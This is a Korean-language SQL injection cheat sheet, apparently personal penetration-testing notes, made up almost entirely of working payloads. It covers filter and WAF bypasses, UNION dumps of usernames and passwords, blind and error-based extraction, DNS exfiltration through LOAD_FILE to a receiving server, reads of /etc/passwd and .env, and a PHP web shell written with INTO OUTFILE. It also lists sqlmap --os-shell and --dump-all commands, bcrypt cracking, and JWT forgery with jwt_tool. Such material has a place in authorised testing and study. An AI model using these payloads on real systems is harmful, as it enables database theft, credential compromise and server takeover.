# SQLi

# SQLi — SQL Injection

웹 애플리케이션이 사용자 입력을 SQL 쿼리에 직접 삽입할 때 발생한다. 로그인 폼, 검색창, URL 파라미터뿐 아니라 프로필 필드, 정렬 파라미터 같은 예상치 못한 곳에서도 터지는 경우가 많다. 발견 즉시 탐지 → 쿼리 구조 유추 → 필터 우회 → 데이터 추출 순서로 진행한다.

---

## 취약점 탐지

입력 필드에 특수문자를 하나씩 넣어서 응답이 달라지는지 확인한다. 에러가 뜨거나 DB 에러 메시지가 보이면 SQLi 가능성이 높다. 에러가 없어도 응답 크기나 내용이 달라지면 Blind SQLi를 의심한다.

```
'           → 에러 뜨면 작은따옴표 기반 쿼리 확정. SQLi 진입점
"           → ' 로 에러 안 날 때 시도. 더블쿼터 기반 쿼리일 때
')          → ' 로 에러 나고 '-- 로도 에러 날 때 시도. 괄호 구조 의심
' OR 1=1--  → 에러 없이 데이터가 더 많이 나오면 WHERE 조건 우회 성공
' OR 1=1#   → -- 가 안 먹힐 때 # 으로 교체해서 시도
' OR 1=1/*  → # 도 안 먹힐 때. 블록 주석으로 뒤 쿼리 무력화
```

---

## 막혔을 때 진단 순서 (실전에서 제일 중요한 부분)

페이로드를 넣었는데 에러가 계속 나거나, 에러는 없는데 결과가 안 나올 때 감으로 이것저것 찍어보지 말고 이 순서로 원인을 좁혀간다.

### 1단계: 힌트가 있는지 먼저 확인

페이지 소스나 HTML 주석에 개발 힌트가 남아있는 경우가 있다 (예: `<!-- Enable debug using ?debug=true -->`, `<!-- TODO -->`, 주석 처리된 코드 조각 등). 이런 힌트가 있으면 그걸 켜서 서버가 실제로 실행하는 쿼리 원문을 확인한다.

```
GET /?debug=true
POST /?debug=true
```

쿼리 원문이 보이면 감으로 짜지 말고 **원문을 보고 그대로 맞춰서** 페이로드를 짠다. 실전에서 이게 있으면 나머지 단계를 전부 생략할 수 있다.

### 2단계: 입력값 앞뒤에 뭐가 자동으로 붙는지 확인

에러 메시지나 debug 출력에 내가 넣은 값 앞뒤로 따옴표/괄호/와일드카드가 자동으로 붙어 나오는지 본다. 흔한 패턴:

```
WHERE col = '입력값'              → 앞뒤로 따옴표만 붙음 (기본형)
WHERE col = ('입력값')            → 괄호까지 같이 붙음
WHERE col LIKE '%입력값%'         → 앞뒤로 % 와일드카드까지 자동으로 붙음 (검색 기능에 흔함)
WHERE col IN ('입력값')           → IN 절, 괄호 구조와 동일하게 처리
```

**LIKE 구조가 제일 자주 사람을 헤매게 만든다** — 뒤에 자동으로 `%'`가 붙는데, 이게 주석(`--`, `#`) 뒤에 붙어버리면 **주석이 그 부분을 못 지우고 문법이 깨지는 경우**가 있다. 이유는 주석 처리 방식이나 서버 쪽 쿼리 재구성 로직에 따라 `%'`가 별도 줄(line)로 취급되면서 주석 범위 밖으로 밀려나기 때문이다. 이럴 땐 주석으로 지우려 하지 말고, **뒤에 붙는 부분을 아예 내 조건문 안에 흡수**시키는 방식으로 접근한다.

```
' UNION SELECT ... WHERE 1=1 OR '1'='1
→ 최종: ... WHERE 1=1 OR '1'='1%'
→ 1=1 이 이미 참이라 뒤에 붙는 %' 가 뭘 하든 전체 결과에 영향 없음

' UNION SELECT ... WHERE 'a' LIKE 'a
→ 최종: ... WHERE 'a' LIKE 'a%'
→ LIKE 문법 자체를 이용해서 뒤에 붙는 % 를 와일드카드로 자연스럽게 흡수
```

### 3단계: 도구 자체의 함정 배제

Burp Repeater 등에서 요청을 직접 편집할 때, **줄 끝 공백이 자동으로 트리밍되는 경우**가 있다. `--`  뒤에 공백을 넣었는데 실제로 전송되는 요청엔 공백이 사라져서 주석이 안 먹히는 것처럼 보일 수 있다. 이럴 땐:

- `--`  대신 공백이 필요 없는 `#` 사용
- 그래도 안 되면 hex/URL 인코딩으로 공백을 명시적으로 넣기 (`%20`)
- Raw 탭에서 바이트 단위로 직접 확인

---

## 쿼리 구조 유추

1단계 힌트가 없다면 아래 순서로 서버가 내부적으로 어떤 쿼리를 실행하는지 구조를 파악한다.

### 1단계 — 따옴표 종류 파악

```
'       → 에러 또는 응답 변화 → 작은따옴표 기반 쿼리 확정 (가장 일반적)
"       → ' 로 에러 안 났을 때 시도 → 에러 나면 더블쿼터 기반 (MySQL ANSI_QUOTES 모드)
`       → ' 와 " 둘 다 에러 없을 때 시도 → MySQL 식별자(컬럼명, 테이블명) 자리
→ 세 가지 모두 에러 없음: 숫자형 파라미터이거나 입력값이 필터링 중
→ 세 가지 모두 에러남:   에러 메시지를 숨기고 있거나 Blind SQLi 가능성
```

### 2단계 — 주석 방식 파악

```
'--   → 정상 응답 나오면 -- 주석 확정. MySQL은 -- 뒤에 공백 1개 이상 필수
'-- -  → -- 뒤 공백이 사라지는 환경(URL 직접 전송 등)에서 대체
'--+   → GET 파라미터에서 + 가 공백으로 디코딩되는 점 이용
'#     → -- 계열이 전부 안 먹힐 때. MySQL 전용, MSSQL/PostgreSQL은 지원 안 함
'/*    → 블록 주석 시작만 넣어도 뒤 쿼리 전체 무력화 가능
';--   → 세미콜론으로 쿼리 강제 종료 + 주석. 다중 쿼리 허용 환경에서만 동작 (MySQL 기본 비허용)
```

### 3단계 — 괄호 구조 파악

```
'#      → 에러 → 괄호가 아직 열려있음. ) 추가해서 재시도
')#     → 에러 없으면 단일 괄호 구조 확정. IN 절도 여기 해당
'))#    → ')# 도 에러 나면 시도. 이중 괄호 구조
```

### 에러 메시지로 구조 바로 파악하기

```
near ''test'' at line 1                          → WHERE 값 = 'test' 구조
near ''test')'' at line 1                        → WHERE 값 IN ('test') 또는 괄호 구조, ') 로 닫아야 함
near ''test'','' at line 1                       → 쉼표 보이면 INSERT/VALUES 절 구조
Unclosed quotation mark after 'test'             → MSSQL 에러, 작은따옴표 구조, # 대신 -- 사용
Unknown column 'test' in 'field list'            → 입력값이 컬럼명 자리, 값 주입 방식 안 통함
syntax error at or near "test"                   → PostgreSQL 에러, 더블쿼터/식별자 구조
Warning: mysql_fetch_array() expects parameter 1 → 쿼리는 실행됐지만 결과 없음, UNION 컬럼 수 불일치
```

---

## 쿼리 구조별 페이로드 조합

```
━━━ 단순 따옴표 구조 (WHERE id = '입력값') ━━━
'--
' OR 1=1--
' UNION SELECT 1,2,3--

━━━ 단일 괄호 구조 (WHERE id = ('입력값')) ━━━
')--
') OR 1=1--
') UNION SELECT 1,2,3--

━━━ IN 절 구조 (WHERE genre IN ('입력값')) ━━━
')--
') OR 1=1--
','악성값')--           # IN 절에 값 추가

━━━ LIKE 절 구조 (LIKE '%입력값%') ━━━
' UNION SELECT ... WHERE 1=1 OR '1'='1     # 뒤에 자동으로 붙는 %' 를 무력화
' UNION SELECT ... WHERE 'a' LIKE 'a       # LIKE 문법으로 % 를 자연스럽게 흡수

━━━ 서브쿼리 구조 (WHERE topic IN (SELECT id FROM t WHERE cat='입력값')) ━━━
1') UNION SELECT password FROM members WHERE ('1'='1

━━━ ORDER BY 절 구조 ━━━
1 ASC--     → 정렬 바뀌면 ORDER BY 절 확정
1 DESC--
(SELECT CASE WHEN (1=1) THEN 1 ELSE 1*(SELECT 1 FROM information_schema.tables) END)

━━━ INSERT / UPDATE 절 구조 ━━━
' AND SLEEP(5),'login')--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))),'login')--
```

---

## 공백 필터 우회

```
')/**/UNION/**/SELECT/**/1,2,3,4,5--       # 가장 범용적
')%09UNION%09SELECT%091,2,3,4,5--          # %09 = 탭
')%0aUNION%0aSELECT%0a1,2,3,4,5--          # %0a = 줄바꿈
')+UNION+SELECT+1,2,3,4,5--                # GET 전용, POST에선 안 됨
')/*!UNION*//*!SELECT*/1,2,3,4,5--         # MySQL 조건부 주석 (WAF 우회)
```

## 키워드 필터 우회

```
') UnIoN SeLeCt 1,2,3,4,5--                # 대소문자 매칭 필터 우회
') UNIunionON SELselectECT 1,2,3,4,5--     # 키워드 제거 방식 필터 우회
') un/**/ion sel/**/ect 1,2,3,4,5--        # 키워드 중간에 주석 삽입
') %55NION SELECT 1,2,3,4,5--              # URL 인코딩 (U → %55)
```

## 따옴표 없이 문자열 삽입

```bash
python3 -c "print('문자열'.encode().hex())"   # → 0x 붙여서 사용
# WHERE table_name='users' → WHERE table_name=0x7573657273

# hex도 필터링되면 CHAR() 조합
python3 -c "print([ord(c) for c in '문자열'])"
# 'users' → CONCAT(CHAR(117),CHAR(115),CHAR(101),CHAR(114),CHAR(115))
```

---

## WAF 우회 심화

### HTTP Parameter Pollution (HPP)

같은 이름의 파라미터를 여러 개 보내면, WAF는 첫 번째 값만 검사하고 서버(백엔드 프레임워크)는 마지막 값을 처리하는 등 서로 다르게 해석하는 경우가 있다. 이 불일치를 이용해 악성 페이로드를 두 번째 파라미터에 숨긴다.

```
POST /login
id=1&id=' UNION SELECT ...--
```

### 헤더 인젝션 지점

바디/URL 파라미터만 막혀 있고 헤더는 검증이 느슨한 경우가 흔하다.

```
X-Forwarded-For: ' UNION SELECT 1,2,3--
User-Agent: ' OR SLEEP(5)-- 
Referer: ' AND 1=1--
```

### sqlmap tamper 스크립트 조합

```bash
sqlmap -r request.txt --tamper=space2comment,between,randomcase --batch
# space2comment : 공백 → /**/
# between       : AND 1=1 → AND 1 BETWEEN 0 AND 2
# randomcase    : 대소문자 무작위 혼용
# charunicodeencode : 문자를 유니코드로 인코딩
# apostrophemask    : 작은따옴표를 유니코드 전각 문자로 치환

sqlmap -r request.txt --level=5 --risk=3 --random-agent --tamper=between,randomcase,space2comment --batch
```

### 이중 URL 인코딩

WAF가 한 번만 디코딩하고 서버는 두 번 디코딩하는 경우, 이중으로 인코딩한 페이로드가 WAF는 통과하고 서버에서만 실제 페이로드로 복원된다.

```
' → %27 → %2527 (이중 인코딩)
```

---

## 컬럼 수 파악

```
' ORDER BY 1--      → 에러 없으면 컬럼 1개 이상
' ORDER BY 2--
' ORDER BY 3--      → 에러 나면 컬럼 수 = 2개 확정

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--   → 정상이면 컬럼 3개 확정
```

## 출력 컬럼 위치 파악

```
' UNION SELECT 1,2,3,4,5--
# 화면에 2가 출력되면 → 2번 자리 사용 가능 (문자열 데이터 추출용)

' UNION SELECT 'a','b','c','d','e'--
# 문자로 확인하면 더 눈에 잘 띔
```

---

## DB 기본 정보 추출

```
' UNION SELECT 1,@@version,3,4,5--
# @@version          → DB 버전, CVE 탐색에 활용
# database()         → 현재 DB명
# user()             → DB 유저, root면 파일 읽기/쓰기 가능
# @@datadir          → DB 파일 저장 경로
# @@secure_file_priv → 파일 읽기/쓰기 허용 경로, 비어있으면 어디든 가능
```

## 테이블 목록 추출

```
' UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,group_concat(table_schema,0x3a,table_name),3,4,5 FROM information_schema.tables--
```

## 컬럼 목록 추출

```
' UNION SELECT 1,group_concat(column_name),3,4,5 FROM information_schema.columns WHERE table_name='<테이블명>'--
' UNION SELECT 1,group_concat(column_name),3,4,5 FROM information_schema.columns WHERE table_name=0x<hex값>--
' UNION SELECT 1,group_concat(table_name,0x3a,column_name),3,4,5 FROM information_schema.columns WHERE table_schema=database()--
```

## 데이터 추출

```
' UNION SELECT 1,group_concat(id,0x3a,username,0x3a,password),3,4,5 FROM <테이블명>--
' UNION SELECT 1,group_concat(username,0x3a,password separator 0x0a),3,4,5 FROM <테이블명>--
' UNION SELECT 1,concat(username,0x3a,password),3,4,5 FROM <테이블명> LIMIT 0,1--
# LIMIT 0,1 / 1,1 / 2,1 ... 앞 숫자를 올려가며 한 줄씩 추출

# information_schema 막혔을 때 컬럼 번호로 접근
SELECT `3` FROM (SELECT 1,2,3 UNION SELECT * FROM <테이블명>)a LIMIT 1,1
```

---

## 인증 우회 (로그인 폼)

```
admin'--         # password 조건이 주석 처리됨, admin 계정 그대로 로그인
admin'#
admin'/*
' OR 1=1--        # WHERE 조건이 항상 참, 첫 번째 유저로 로그인
' OR 1=1 LIMIT 1-- # 여러 결과 반환 에러 나면 LIMIT 1 추가

# password 필드에 넣기 (username 아는 경우)
# username: admin, password: ' OR '1'='1
```

---

## Second Order SQLi

입력 시점에는 에러가 없지만 저장된 값이 **다른 기능에서 재사용될 때** 터지는 방식이다. 회원가입 username에 페이로드를 넣으면 즉시 실행되지 않지만, 나중에 비밀번호 변경/프로필 조회 기능에서 저장된 값이 그대로 쿼리에 들어가면서 실행된다.

```
# 1단계: 회원가입 username에 저장
admin'--

# 2단계: 비밀번호 변경 시 서버가 실행하는 쿼리
UPDATE users SET password='newpass' WHERE username='admin'--' AND oldpass='oldpass'
# -- 이후가 주석 처리되어 oldpass 검증이 무력화됨

# 탐지: 데이터 저장 기능(가입, 프로필 수정)에 순서대로 넣고, 그 값이 쓰이는 다른 기능에서 이상 동작 확인
admin'--
test'--
' OR 1=1--
```

---

## Boolean Blind SQLi

```
' AND 1=1--     → 참, 정상 응답
' AND 1=2--     → 거짓, 다른 응답 (크기/내용 차이) → Boolean Blind 가능

' AND SUBSTRING((SELECT password FROM <테이블명> LIMIT 1),1,1)='a'--
' AND (SELECT SUBSTRING(password,1,1) FROM <테이블명> WHERE username='<유저명>')='a'--
' AND ASCII(SUBSTRING((SELECT password FROM <테이블명> LIMIT 1),1,1))>97--   # 이진 탐색으로 더 빠르게
```

## Time Based Blind SQLi

```
' AND SLEEP(5)--                    # 5초 딜레이 나오면 가능 확인, 네트워크 느리면 10으로
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING((SELECT password FROM <테이블명> LIMIT 1),1,1)='a',SLEEP(5),0)--
' AND IF(ASCII(SUBSTRING((SELECT password FROM <테이블명> LIMIT 1),1,1))>97,SLEEP(5),0)--
' AND IF((SELECT count(*) FROM <테이블명> WHERE username='<유저명>')=1,SLEEP(5),0)--
```

## Error Based SQLi

```
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT concat(username,0x3a,password) FROM <테이블명> LIMIT 0,1)))--
```

## Out of Band SQLi

응답 차이도 없고 딜레이도 안 먹힐 때 DNS 쿼리로 데이터를 외부로 빼낸다. Burp Collaborator나 interactsh 같은 외부 수신 서버가 필요하다.

```
' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM <테이블명> LIMIT 1),'.<수신서버주소>\\test'))--
' AND LOAD_FILE(CONCAT('\\\\',(SELECT hex(password) FROM <테이블명> LIMIT 1),'.<수신서버주소>\\'))--
```

---

## 파일 읽기/쓰기

DB 유저가 FILE 권한을 가지고 있으면 서버 파일을 읽거나 웹쉘을 올릴 수 있다.

```
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5--
' UNION SELECT 1,LOAD_FILE('/var/www/html/.env'),3,4,5--
' UNION SELECT 1,LOAD_FILE('/etc/nginx/sites-enabled/default'),3,4,5--   # 웹 루트 경로 모를 때

' UNION SELECT 1,'<?php system($_REQUEST["cmd"]); ?>',3,4,5 INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT 1,'<?php system($_REQUEST["cmd"]); ?>',3,4,5 INTO DUMPFILE '/var/www/html/shell.php'--   # OUTFILE 막히면
```

---

## bcrypt 해시 획득 후 처리

```
$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa
 ^^  ^^  ^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 |   |   22자 salt               31자 실제 해시값
 |   cost factor (2^10 = 1024 라운드)
 알고리즘 버전 ($2a$ $2b$ $2y$ 전부 bcrypt)
```

```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
john --format=bcrypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 3200 hash.txt --show
```

bcrypt는 의도적으로 느리게 설계돼(cost factor) 크래킹이 매우 어렵다. rockyou.txt로 안 뚫리면 포기하고 다른 경로를 찾는다. salt가 유저마다 달라 레인보우 테이블도 무효다.

### 크래킹 없이 해시 직접 활용 (API 설계 결함)

일부 API가 로그인 시 비밀번호 대신 해시를 그대로 받는 경우가 있다. 구버전 API 엔드포인트가 남아있는지 확인해본다.

```bash
curl -i -X POST http://<대상>/api/v2/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"<이메일>","hash":"<bcrypt해시전체>"}'
```

### bcrypt 72바이트 truncation

bcrypt는 입력값을 72바이트까지만 처리하고 그 이후는 무시한다. `userId + username + password`처럼 여러 값을 합쳐서 해싱하는 구조에서, 앞부분이 이미 72바이트를 넘으면 비밀번호가 아예 해싱에서 제외된다.

```bash
python3 -c "print('A'*60)"   # 54자 이상 긴 username으로 가입 후 아무 비밀번호로 로그인 시도
```

---

## JWT 토큰 다루기

```bash
echo '<JWT_페이로드부분>' | base64 -d 2>/dev/null | python3 -m json.tool

python3 jwt_tool.py <토큰전체>
python3 jwt_tool.py <토큰전체> -X a                              # alg:none 공격
python3 jwt_tool.py <토큰전체> -C -d /usr/share/wordlists/rockyou.txt   # HS256 시크릿 브루트포스
python3 jwt_tool.py <토큰전체> -T -S hs256 -p '<JWT_SECRET>'     # 시크릿 확보 시 직접 위조
```

---

## sqlmap 자동화

```bash
sqlmap -u "http://<대상>/page?id=1" --batch
sqlmap -u "http://<대상>/login" --data="username=admin&password=test" --batch
sqlmap -u "http://<대상>/api/v1/users" --headers="Authorization: Bearer <토큰>" --batch

# Burp에서 요청 파일로 저장 후 실행 (가장 편한 방법)
sqlmap -r request.txt --batch
sqlmap -r request.txt -p <파라미터명> --batch          # 특정 파라미터만 지정
sqlmap -r request.txt --dbs --batch
sqlmap -r request.txt --tables -D <DB명> --batch
sqlmap -r request.txt -D <DB명> -T <테이블명> --dump --batch
sqlmap -r request.txt --dump-all --batch

sqlmap -r request.txt --tamper=space2comment,between,randomcase --batch
sqlmap -r request.txt --technique=BEUSTQ --level=5 --risk=3 --batch   # 가장 공격적, 실환경 주의

sqlmap -r request.txt --file-read="/etc/passwd" --batch
sqlmap -r request.txt --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php" --batch
sqlmap -r request.txt --os-shell --batch
sqlmap -r request.txt --proxy=http://127.0.0.1:8080 --batch
```

---

## 팁

- 페이지에 debug 힌트, 주석, TODO가 남아있는지 항상 먼저 확인한다 — 감으로 짜는 것보다 100배 빠르다
- 뒤에 자동으로 뭔가 붙는 구조(LIKE, 서브쿼리)는 주석으로 지우려 하지 말고 조건문 안에 흡수시키는 방식을 먼저 시도한다
- Burp Repeater에서 줄 끝 공백이 트리밍될 수 있다는 걸 염두에 두고, 안 되면 공백이 필요 없는 주석 방식으로 바꾼다